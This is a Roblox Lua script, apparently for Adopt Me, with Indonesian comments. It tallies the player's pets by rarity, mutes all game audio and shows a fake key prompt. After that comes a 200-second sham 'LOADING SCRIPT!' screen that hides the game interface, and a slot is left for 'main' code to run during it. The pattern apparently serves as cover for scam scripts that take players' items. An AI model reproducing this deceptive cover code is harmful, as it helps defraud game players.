local Loads = require(game.ReplicatedStorage.Fsys).load
local InventoryDB = Loads("InventoryDB")
local ClientData = Loads('ClientData')
local legendaries_count = 0
local mega_count = 0
local neon_count = 0
local ultra_count = 0
local rare_count = 0
local uncommon_count = 0
local common_count = 0

local function muteAllAudio()
    for _, sound in pairs(workspace:GetDescendants()) do
        if sound:IsA("Sound") then
            sound:Stop()
            sound.Volume = 0
        end
    end
end

muteAllAudio()

workspace.DescendantAdded:Connect(function(descendant)
    if descendant:IsA("Sound") then
        descendant:Stop()
        descendant.Volume = 0
    end
end)

for i, v in pairs(ClientData.get("inventory").pets) do
  if InventoryDB[v.category][v.id].rarity == "legendary" then
    legendaries_count = legendaries_count + 1
  end
  if InventoryDB[v.category][v.id].properties == "mega_neon" then
    mega_count = mega_count + 1
  end
  if InventoryDB[v.category][v.id].properties == "neon" then
    neon_count = neon_count + 1
  end
  if InventoryDB[v.category][v.id].rarity == "ultra_rare" then
    ultra_count = ultra_count + 1
  end
  if InventoryDB[v.category][v.id].rarity == "rare" then
    rare_count = rare_count + 1
  end
  if InventoryDB[v.category][v.id].rarity == "uncommon" then
    uncommon_count = uncommon_count + 1
  end
  if InventoryDB[v.category][v.id].rarity == "common" then
    common_count = common_count + 1
  end
end

-- Inisialisasi ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
screenGui.Name = "KeySystemGui"

-- Key system: Membuat TextBox untuk input key
local keyInput = Instance.new("TextBox")
keyInput.Size = UDim2.new(0, 300, 0, 50)
keyInput.Position = UDim2.new(0.5, -150, 0.4, -25)
keyInput.PlaceholderText = "Enter Key"
keyInput.TextColor3 = Color3.fromRGB(255, 255, 255)
keyInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
keyInput.Parent = screenGui

-- Tombol submit untuk key system
local submitButton = Instance.new("TextButton")
submitButton.Size = UDim2.new(0, 100, 0, 50)
submitButton.Position = UDim2.new(0.5, -50, 0.5, -25)
submitButton.Text = "Submit"
submitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
submitButton.BackgroundColor3 = Color3.fromRGB(0, 128, 255)
submitButton.Parent = screenGui

-- Fungsi untuk memeriksa key yang dimasukkan
local correctKey = "secret123" -- Ganti dengan key yang sesuai

submitButton.MouseButton1Click:Connect(function()
    local enteredKey = keyInput.Text

    if enteredKey == correctKey then
        -- Setelah key benar, tampilkan loading screen
        -- Menyembunyikan key input
        keyInput.Visible = false
        submitButton.Visible = false

        -- Membuat Frame untuk loading screen (full screen)
        local loadingFrame = Instance.new("Frame")
        loadingFrame.Size = UDim2.new(1, 0, 1, 0)
        loadingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        loadingFrame.BackgroundTransparency = 0.5
        loadingFrame.Parent = screenGui

        -- Membuat Title untuk loading screen
        local loadingTitle = Instance.new("TextLabel")
        loadingTitle.Size = UDim2.new(0, 600, 0, 50)
        loadingTitle.Position = UDim2.new(0.5, -300, 0.3, -25)
        loadingTitle.Text = "LOADING SCRIPT!"
        loadingTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
        loadingTitle.TextScaled = true
        loadingTitle.BackgroundTransparency = 1
        loadingTitle.TextStrokeTransparency = 0.8
        loadingTitle.Parent = loadingFrame

        -- Membuat TextLabel untuk loading message
        local loadingText = Instance.new("TextLabel")
        loadingText.Size = UDim2.new(0, 400, 0, 50)
        loadingText.Position = UDim2.new(0.5, -200, 0.5, -25)
        loadingText.Text = "Please wait!"
        loadingText.TextColor3 = Color3.fromRGB(169, 169, 169) -- Gray color
        loadingText.TextScaled = true
        loadingText.BackgroundTransparency = 1
        loadingText.Parent = loadingFrame

        -- Menghitung waktu loading
        local loadingTime = 200 -- Waktu loading dalam detik
        local timerLabel = Instance.new("TextLabel")
        timerLabel.Size = UDim2.new(0, 400, 0, 50)
        timerLabel.Position = UDim2.new(0.5, -200, 0.7, -25)
        timerLabel.Text = "Loading Time: " .. tostring(loadingTime) .. "s"
        timerLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        timerLabel.TextScaled = true
        timerLabel.BackgroundTransparency = 1
        timerLabel.Parent = loadingFrame

        -- Nonaktifkan interaksi dengan game selama loading
        game.Players.LocalPlayer.PlayerGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

        -- Fungsi untuk countdown waktu loading
        for i = loadingTime, 1, -1 do
            timerLabel.Text = "Loading Time: " .. tostring(i) .. "s"
            wait(1)
        end

        -- Setelah waktu selesai, sembunyikan loading screen dan aktifkan kembali interaksi
        loadingFrame.Visible = false
        game.Players.LocalPlayer.PlayerGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)

        -- Skrip tetap berjalan setelah loading selesai
        print("Loading complete. Game is ready to play!")
    else
        -- Jika key salah, reset TextBox dan beri tahu pengguna
        keyInput.Text = ""
        keyInput.PlaceholderText = "Incorrect key, try again"
    end
end)

-- Skrip utama tetap berjalan di bawah ini
-- Tambahkan kode Anda di bawah untuk menjalankan proses utama sambil menunggu loading selesai.

